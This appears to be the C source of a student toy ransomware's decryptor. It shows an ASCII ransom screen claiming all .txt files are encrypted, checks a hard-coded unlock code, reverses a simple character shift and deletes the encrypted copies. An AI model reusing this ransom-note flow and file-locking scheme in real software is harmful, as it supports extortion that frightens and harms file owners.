/*
日期:2020/12/6
作者:于京平 
內容:解鎖畫面製作，解密程序雛形製作。

日期:2020/12/12
作者:于京平 
內容:解密程序完成，解密程式畫面製作完成。
*/
#include <stdio.h>
#include <stdlib.h> 
#include <string.h>
#include <windows.h>

void txt_file(void){
  system("cd hack && dir /B *.txt >> ../UNlook/hack.txt");
}

char decryption(FILE *fptr4, FILE *fptr3){
  char ch;
  while(1)
    {
        ch = fgetc(fptr4);
        if(ch == EOF)
        {
            break;
        }
        else
        {
            ch = ch + (8 * 5 - 3);
            fputc(ch, fptr3);
        }
    }
}

void file_read_hackTXT(void){
  FILE *fptr3, *fptr4;
  char file3[1000];
  
  while(1){
    txt_file();
    fptr3 = fopen("UNlook/hack.txt", "r");
    fgets(file3, 1000, fptr3);
    strtok(file3, "\n");
    fclose(fptr3);
    char file4[1000] = "hack/";
    strcat(file4, file3);
    fptr4 = fopen(file4, "r");
    remove("UNlook/hack.txt");
    if(fptr4 == NULL){
      break;
    }
    fptr3 = fopen(file3, "w");
    decryption(fptr4, fptr3);
    fclose(fptr3);
    fclose(fptr4);
    remove(file4);
  }
}

int main(void){
  printf("          *                    *                                                    \n");
  printf("         * *                  * *                                                   \n");
  printf("        *   *                *   *                                                  \n");
  printf("       *     *              *     *                                                 \n");
  printf("      *       *            *       *                                                \n");
  printf("     *         *          *         *                                               \n");
  printf("    *           **********           *      你在此資料夾所有txt附檔名的檔案都被我加密了，\n");
  printf("   *    ****                   ****   *     如果想要回你的檔案                        \n");
  printf("  *       ********       ********      *                                            \n");
  printf(" *          *******************         *                                           \n");
  printf("*            *****      *****            *                                          \n");
  printf("*         *   ***    *   ***     *        *                                         \n");
  printf(" *          *       ***       *           *                                         \n");
  printf("  *           *      *      *            *                                          \n");
  printf("   *   *  *  *               *  *  *    *                                           \n");
  printf("    *        *      * *     *          *                                            \n");
  printf("     *     *         *        *      *                                              \n");
  printf("      *   *                     *   *                                               \n");
  printf("     *                               *                                              \n");
  printf("    *                                 *                                             \n");
  printf("   *                                   *                                            \n");
  printf("  *                                     *                                           \n");
  printf(" *                                       *                                          \n");
  printf("*                                         *                                         \n");
  printf("*******************************************                                         \n");
  printf("____________________________________________________________________________________\n");
  printf("請輸入你的解鎖碼: ");


  int UnlookCode = 0;
  scanf("%d", &UnlookCode);
  if(UnlookCode == 123){
    system("md UNlook");
    system("cls");
    printf("          *                    *                                                    \n");
    printf("         * *                  * *                                                   \n");
    printf("        *   *                *   *                                                  \n");
    printf("       *     *              *     *                                                 \n");
    printf("      *       *            *       *                                                \n");
    printf("     *         *          *         *                                               \n");
    printf("    *           **********           *      密碼正確，檔案恢復中，請稍等。              \n");
    printf("   *    ****                   ****   *                                             \n");
    printf("  *       ********       ********      *                                            \n");
    printf(" *          *******************         *                                           \n");
    printf("*            *****      *****            *                                          \n");
    printf("*         *   ***    *   ***     *        *                                         \n");
    printf(" *          *       ***       *           *                                         \n");
    printf("  *           *      *      *            *                                          \n");
    printf("   *   *  *  *               *  *  *    *                                           \n");
    printf("    *        *      * *     *          *                                            \n");
    printf("     *     *         *        *      *                                              \n");
    printf("      *   *                     *   *                                               \n");
    printf("     *                               *                                              \n");
    printf("    *                                 *                                             \n");
    printf("   *                                   *                                            \n");
    printf("  *                                     *                                           \n");
    printf(" *                                       *                                          \n");
    printf("*                                         *                                         \n");
    printf("*******************************************                                         \n");
    printf("____________________________________________________________________________________\n");
    file_read_hackTXT();
    system("cls");
    printf("          *                    *                                                    \n");
    printf("         * *                  * *                                                   \n");
    printf("        *   *                *   *                                                  \n");
    printf("       *     *              *     *                                                 \n");
    printf("      *       *            *       *                                                \n");
    printf("     *         *          *         *                                               \n");
    printf("    *           **********           *      資料修復完畢，                            \n");
    printf("   *    ****                   ****   *     你的txt檔均已恢復。                       \n");
    printf("  *       ********       ********      *                                            \n");
    printf(" *          *******************         *                                           \n");
    printf("*            *****      *****            *                                          \n");
    printf("*         *   ***    *   ***     *        *                                         \n");
    printf(" *          *       ***       *           *                                         \n");
    printf("  *           *      *      *            *                                          \n");
    printf("   *   *  *  *               *  *  *    *                                           \n");
    printf("    *        *      * *     *          *                                            \n");
    printf("     *     *         *        *      *                                              \n");
    printf("      *   *                     *   *                                               \n");
    printf("     *                               *                                              \n");
    printf("    *                                 *                                             \n");
    printf("   *                                   *                                            \n");
    printf("  *                                     *                                           \n");
    printf(" *                                       *                                          \n");
    printf("*                                         *                                         \n");
    printf("*******************************************                                         \n");
    printf("____________________________________________________________________________________\n");
  }
  system("rd hack");
  system("rd UNlook");
  return 0;
}
